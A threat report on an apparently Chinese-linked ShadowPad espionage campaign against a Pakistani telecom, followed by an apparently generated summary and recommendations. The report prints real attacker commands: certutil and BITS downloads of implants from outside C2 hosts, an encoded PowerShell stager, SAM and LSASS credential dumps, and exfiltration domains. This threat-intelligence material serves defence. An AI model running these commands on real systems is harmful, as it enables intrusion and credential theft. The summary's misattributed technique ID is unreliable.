@@ -1,0 +1,315 @@
+
+
+
+Sentence : Incident 3. Pakistan
+Victim summary
+Contents 37
+Threat
+Shadowpad, PlugX,
+China Chopper,
+Stowaway RAT
+Industry
+Telecommunications
+Incident description
+Countries affected
+Pakistan
+In mid-Autumn of 2021, Kaspersky experts detected a new ShadowPad malware campaign targeting one of the
+national telecom companies of Pakistan. During a retrospective analysis of suspicious activity in the telecom
+network, experts were able to detect an active backdoor of the ShadowPad family on computers of ICS
+engineers and on automation systems. Based on the collected data, we can presume that the attack began no
+later than the winter of 2021, and the attackers were active on the network for at least 11 months.
+Detailed description
+It is assumed that the initial infection occurred due to an exploit of a vulnerability in MS Exchange: CVE-202126855 — Exploit Public-Facing Application T1190. After gaining access to the system, the attackers installed
+the Cobalt Strike backdoor, which was most likely used for the initial collection of information, including
+authentication data. It is our presumption that this data was used for lateral movement through the network.
+The mail server of the victim had a Web Shell in the form of a malicious DLL used by the attackers to gain
+remote access to the server.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 3. Pakistan
+Figure 16 Malicious DLL—Web Shell
+Sequence of commands:
+cmd /c cd /d "C:/inetpub/wwwroot/aspnet_client"&whoami&echo [S]&cd&echo [E]"
+This was previously seen in the well-known Web Shell named "China Chopper Webshell [5] "
+5
+China Chopper
+Learn more
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Contents 38
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 3. Pakistan Contents 39
+The backdoor was installed in the system as a Windows service (Windows Service T1543.003). The Cobalt
+Strike typically uses services with names consisting of 8 random characters:
+$hklm\system\controlset001\services\hixnjvod
+Windows Command Shell T1059.003 + PowerShell T1059.001 + Obfuscated Files or Information T1027:
+The executable file used for the service was cmd.exe with parameters for running a script in PowerShell. This
+script contained Cobalt Strike in the form of binary (shell) code with a size of ~100 bytes, was executed in the
+context of the PowerShell process, and used the Win32 API.
+С:\Windows\system32\cmd.exe /b /c start /b /min PowerShell.exe -nop -w hidden -noni -c
+"if([IntPtr]::Size -eq 4){$b=$env:windir+
+'\sysnative\WindowsPowerShell\v1.0\PowerShell.exe'}else{$b='PowerShell.exe'};$s=NewObject System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop
+-w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object
+System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.
+Convert]::FromBase64String(''H4sIAIKCBWACA7VWa2+
+bSBT9nEj5D6iyZFAcP5I0bSJVWsY2McR2jYlxbK+1IjDA1MMjMDgm3f73vYMhTbdp....
+'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
+$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;
+$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
+Ingress Tool Transfer T1105:
+We also observed the installation of Cobalt Strike using the LOLBin tool certutil.exe (Living off the Land
+Binary):
+$system32\cmd.exe /c certutil.exe -urlcache -split -f hxxp://116.206.92[.]26:82/update.exe && update.
+exe && certutil.exe -urlcache -split -f hxxp://116.206.92[.]26:82/update.exe delete
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 3. Pakistan Contents 40
+Communication with the C2 server
+We detected a version of Cobalt Strike in which the malware does not connect to a C&C server. Instead, it
+opens a network port and waits for a connection.
+To work properly, this version of Cobalt Strike must receive binary shell code that will be executed
+synchronously after it is received and copied to dynamic memory. Then Cobalt Strike uses the JMP command
+to divert execution to the received shell code. To connect to Cobalt Strike, the victim must have an open public
+IP address, or the attacker must be in the same subnet as the victim. For this connection, the attacker often
+uses "pivoting" to route traffic that is not usually routed in normal conditions.
+Event Triggered Execution: Windows Management Instrumentation Event Subscription T1546.003
+On one of the infected hosts, we detected execution of the malicious file GoogleUpdate.exe (MD5:
+BF78566E8FE8B51D0AB7190917846C10). Its parent process was wmiprvse.exe, which indicates that an WMI
+event subscription was created by the attackers for persistence purposes.
+instance of __EventFilter {
+EventNamespace = "root\cimv2";
+Name = "Chrome Update";
+Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance
+ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >=240 AND
+TargetInstance.SystemUpTime < 325";
+QueryLanguage = "WQL"; };
+instance of CommandLineEventConsumer {
+ExecutablePath = "C:\Windows\System32\GoogleUpdate.exe";
+Name = "GoogleUpdater";
+};
+PowerShell T1059.001 + BITS Jobs T1197 + Obfuscated Files or Information T1027
+When executed, GoogleUpdate.exe downloads the second-stage "Stowaway" implant by running the following:
+PowerShell "Start-BitsTransfer -Source hxxp://security.lomiasecure[.]net/crx/node.txt Destination C:\Users\public\node.txt -transfertype download"
+PowerShell if($InputString = Get-Content 'C:\users\public\node.txt'){
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 3. Pakistan
+Contents 41
+The sample uses BITS Jobs to access the C2 and download the text file node.txt, which was converted into an
+executable file named node.exe (MD5: 344edbebb97ed8dfe79805a721b4048b).
+Figure 17
+Kaspersky Threat Attribution Engine Report
+Scheduled Task/Job: Scheduled Task T1053.005
+Then the attackers move node.exe to C:\Windows\Registration\crml.exe, change the file attributes by making it
+a system file, and create a scheduled job:
+attrib +s crml.exe
+schtasks /Create /Tn \Microsoft\Windows\Registration\CRMLog /sc daily /st 11:50 /tr
+"С:\Windows\Registration\crml.exe" /ru system /f
+schtasks /run /Tn \Microsoft\Windows\Registration\CRMLog
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 3. Pakistan
+Hijack Execution Flow: DLL Side-Loading T1574.002
+Contents 42
+Googleupdate.exe also started the ShadowPad backdoor and downloaded the following two executable files
+with the TXT extension from Google Drive:
+
+
+Legitimate executable file named AppLaunch.txt that is part of the Microsoft .NET platform
+
+
+ShadowPad DLL named "mscoree.txt"
+
+
+It decodes them from base64 and changes the extensions:
+c:\programdata\microsoft\windows\caches\dnscache.exe (applaunch.exe)
+MD5: 41F3BF4FA8FA92BF111FD8A47A0D470F
+c:\programdata\microsoft\windows\caches\mscoree.dll
+MD5: 8d46b2d39a8de09a5dc9f226b360b0ef
+AppLaunch.exe was started as a service (parent process C:\Windows\System32\services.exe).
+Figure 18 ShadowPad DLL (mscoree.dll) is loaded into the legitimate process
+AppLaunch.exe
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 3. Pakistan Contents 43
+Figure 19 Kaspersky Threat Attribution Engine
+On the compromised server where the Web Shell was installed, we also detected a download of the
+ShadowPad backdoor via BITS Jobs — BITS Jobs T1197.
+$system32\cmd.exe /c bitsadmin /transfer n
+https://raw/githubusercontent.com/tellyou123/1/master/aro.dat $temp\aro.dat > C:\inetpub\wwwroot\
+aspnet_client\1.txt
+During our analysis, we were also able to detect different variants of DLL Sideloading used to download and
+then run this backdoor. For example, we observed the legitimate application OLEVIEW.EXE being used to
+implement DLL Sideloading T1574.002:
+OLEVIEW.EXE
+MD5: FDD423B3855A9AE5E83FFB1CC80D2215 (x86)
+MD5: 8FDF8E4ECFF114C1E6C9827C53742A1C (x64)
+iviewers.dll
+MD5: 13759AE233572847A2F75D36AA51FABC
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 3. Pakistan
+Contents 44
+iviewers.dll connects to the C2 server and downloads the ShadowPad backdoor from it: iviewers.dll.dat.
+Then OLEVIEW.EXE creates a new svchost.exe process to avoid detection and injects the malicious payload of
+ShadowPad into this process (Process Hollowing T1055.012).
+Valid Accounts T1078:
+We detected signs indicating that the attackers were spreading to other computers on the network two
+months after the initial infection. This may mean that the attackers were not in a hurry, and were trying to avoid
+early detection. It is assumed that the attackers used valid account credentials for authentication, or used
+account credentials that were previously gathered from a compromised host for lateral movement through the
+network.
+Using the backdoor, the attackers were able to execute commands remotely and download new tools.
+As a result, we see that cmd.exe was run from the ShadowPad-infected svchost.exe and a series of commands
+for reconnaissance:
+MITRE ATT&CK Commands
+matrix technique
+System Owner/User Discovery T1033 quser.exe quser
+cmd.exe /C arp -a >
+System Network Configuration Discovery T1016
+$temp\gGjrIFGa.tmp 2>&1
+netstat.exe -ano
+System Network Connections Discovery T1049 netstat.exe user
+ping.exe 8.8.8.8
+Remote System Discovery T1018 ping.exe google.com
+ping.exe 167.179.64[.]62
+Data from Local System T1005
+After executing discovery commands, the attacker copied the contents of the desktop and downloads folder,
+which may potentially contain confidential information, into the directory C:\$recycle.bin\temp:
+cmd.exe /C xcopy /s $user\desktop c:\$recycle\bin\temp\
+cmd.exe /C xcopy /s $user\downloads c:\$recycle\bin\temp\
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 3. Pakistan Contents 45
+—
+Archiving desktop contents Archive Collected Data: Archive via Utility T1560.001:
+cmd.exe /C $programfiles\winrar\rar.exe a -r -hp1234 C:$recycle.bin\10020111desk.rar
+$user\desktop*.txt
+$user\desktop*.xls
+$user\desktop*.pdf
+$user\desktop*.doc
+$user\desktop*.jpg >
+$temp\lwefqERM.tmp 2>&1
+OS Credential Dumping: Security Account Manager T1003.002
+Then we detected that a suspicious file was run from the recycle bin (c:\$recycle.bin\temp). This file was named
+m1.log (Trojan-PSW.Win32.Mimikatz.eni)
+We also detected a dump of the SAM registry hive using the system utility reg.exe:
+С:\Windows\System32\reg.exe save hklm\sam sam.hive
+The dump was saved to the recycle bin С:\$recycle.bin\temp, then the temp folder in the recycle bin was rearchived.
+After some time, the attackers used the procdump64.exe tool, which was renamed to errorreport.exe:
+errorreport.exe -ma lsass.exe l.dmp
+LSASS dump was performed several times over the course of several days using Mimikatz and Procdump.
+Remote Services: SMB/Windows Admin Shares T1021.002
+During the next stage, the BAT file $windir\help\sys.bat was executed to mount network drives using the
+compromised credentials of a user:
+net use \ "" /u:\
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 3. Pakistan Contents 46
+We noticed POST requests from the svchost.exe process (ShadowPad) to the following resources (probably to
+exfiltrate the collected data):
+order.cargobussiness[.]site/
+documents.kankuedu[.]org/
+live.musicweb[.]xyz
+obo.videocenter[.]org
+tech.obj[.]services
+houwags.defineyourid[.]site
+noub.crabdance[.]com
+grandfoodtony[.]com
+Later, similar activity was detected on other computers in the network. However, the attacker used a BAT
+file instead of manually executing commands. Notably, the choice command was used instead of the ping
+command in the sleep role:
+cmd /c mkdir С:\Windows\temp\debugsms
+cmd /c reg save hklm\sam С:\Windows\temp\debugsms\sam
+cmd /c reg save hklm\system С:\Windows\temp\debugsms\system
+cmd /c reg save hklm\security С:\Windows\temp\debugsms\security
+cmd /c choice /t 1 /d y /n >nul
+cmd /c ipconfig /all > С:\Windows\temp\debugsms\ip.txt
+cmd /c arp -a > С:\Windows\temp\debugsms\arp.txt
+cmd /c dir /b /s С:\Windows\temp\debugsms\ > С:\Windows\temp\siineidvsms.log
+cmd /c makecab /f С:\Windows\temp\siineidvsms.log /d compressiontype=lzx /d
+compressionmemory=21 /d maxdisksize=10240000000 /d diskdirectorytemplate=”C:\Program Files\
+Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth” /d cabinetnametemplate=iisstop.png
+cmd /c choice /t 1 /d y /n>nul
+cmd /c start С:\Windows\temp\TMP23876.bat
+cmd /c rmdir /s /q С:\Windows\temp\debugsms
+Collection and Exfiltration
+On another infected host, the attackers created the following job in the form of a PowerShell command in the
+task scheduler for data collection and exfiltration
+cmd /c С:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.EXE -c "$ctnt=Get-Content
+$temp\Err_36d96944_6318.log;PowerShell -enc $ctnt;
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 3. Pakistan Contents 47
+The file $temp\Err_36d96944_6318.log contains a base64 string comprising the following script:
+Figure 20 Script contents
+This complex type of startup is a technique known as Obfuscated Files or Information T1027.
+Automated Collection T1119 + Archive Collected Data: Archive via Utility T1560.001
+This script uses a recursive search to gather files with the extensions .txt, .rtf, .pdf, .ppt, .pptx, .doc (the
+attacker's script has the typo ',doc'), .docx, .csv, xlsx, .xls, .vsd, .pst, .eml, .jpg, .jpeg, and *.png, then
+copies them to a separate directory, archives them, and runs an exfiltration script that is also encoded into a
+base64 string (line 21).
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 3. Pakistan
+Automated Exfiltration T1020 + Exfiltration Over C2 Channel T1041
+The exfiltration script is presented below:
+Figure 21 Script contents
+Summary
+Contents 48
+This incident describes another campaign of the ShadowPad malware aimed at national infrastructure.
+ShadowPad samples were also detected in Afghanistan and in a transportation company in Malaysia. This may
+be an indication of far-reaching geographic interests of the particular APT group. It is likely that the main goal of
+the attackers is to gather critical or confidential data through cyberespionage. Notably, the campaign primarily
+involved use of the technique known as Hijack Execution Flow: DLL Side-Loading T1574.002, which is
+typical of Asian APT groups.
+Download techniques in JSON format for MITRE Navigator:
+Learn more
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 3. Pakistan Contents 49
+Figure 22
+Threat Landscape page interface in TIP
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Contents 50
+Incidents involving Asian APT groups in various regions of the planet
+Output : 
+This detailed report outlines a sophisticated cyber-espionage campaign targeting national infrastructure in Pakistan. The attack appears to be part of a broader campaign by an Advanced Persistent Threat (APT) group, likely originating from Asia, given the techniques used and previous sightings of similar malware in other countries like Afghanistan and Malaysia.
+
+### Key Points:
+
+1. **Initial Infection:**
+   - **Backdoor Deployment:** The attackers deployed a backdoor to gain remote access.
+   - **C2 Communication:** Initial communication with Command and Control (C2) servers was established using tools like ShadowPad.
+
+2. **Lateral Movement:**
+   - **Valid Account Credentials:** The attackers used legitimate user credentials, possibly obtained from the initial infection, to move laterally within the network.
+   - **Remote Execution:** Commands were executed remotely on other machines to gather information and spread the infection.
+
+3. **Reconnaissance:**
+   - **System Discovery:** Tools like `quser`, `arp`, `netstat`, and `ping` were used to discover system owners, network configurations, and remote systems.
+   - **Data Collection:** Sensitive data from user directories (e.g., Desktop, Downloads) was copied and archived.
+
+4. **Credential Dumping:**
+   - **SAM Registry Hive Dump:** The Security Account Manager (SAM) registry hive was dumped using `reg.exe`.
+   - **LSASS Dump:** The Local Security Authority Subsystem Service (LSASS) process was dumped multiple times using tools like Mimikatz and Procdump to extract credentials.
+
+5. **Data Exfiltration:**
+   - **Archiving:** Collected data was archived using utilities like WinRAR.
+   - **Exfiltration Scripts:** PowerShell scripts were used to automate the collection and exfiltration of data over C2 channels.
+   - **Network Shares:** Network drives were mounted using compromised credentials to facilitate data transfer.
+
+6. **Obfuscation:**
+   - **Base64 Encoding:** Scripts and commands were often encoded in base64 to evade detection.
+   - **Process Hollowing:** Malicious payloads were injected into legitimate processes (e.g., `svchost.exe`) to avoid suspicion.
+
+### Techniques Used (MITRE ATT&CK):
+- **T1033** - System Owner/User Discovery
+- **T1016** - System Network Configuration Discovery
+- **T1049** - System Network Connections Discovery
+- **T1018** - Remote System Discovery
+- **T1005** - Data from Local System
+- **T1560.001** - Archive via Utility
+- **T1003.002** - Security Account Manager (SAM) Dumping
+- **T1078** - Valid Accounts
+- **T1021.002** - SMB/Windows Admin Shares
+- **T1119** - Automated Collection
+- **T1020** - Exfiltration Over C2 Channel
+
+### Summary:
+This incident highlights the sophisticated nature of APT attacks, particularly those originating from Asia. The use of DLL side-loading and other obfuscation techniques indicates a high level of skill and intent to remain undetected for extended periods. The primary goal appears to be cyberespionage, with a focus on gathering critical or confidential data from national infrastructure.
+
+### Recommendations:
+- **Enhance Network Monitoring:** Implement advanced monitoring tools to detect unusual activity and lateral movement.
+- **Strengthen Authentication:** Use multi-factor authentication (MFA) and regularly update credentials.
+- **Regular Audits:** Conduct regular security audits and penetration testing to identify and mitigate vulnerabilities.
+- **Employee Training:** Educate employees about phishing and other social engineering tactics to reduce the risk of initial infection.
+
+By understanding these techniques, organizations can better prepare and defend against similar attacks in the future.
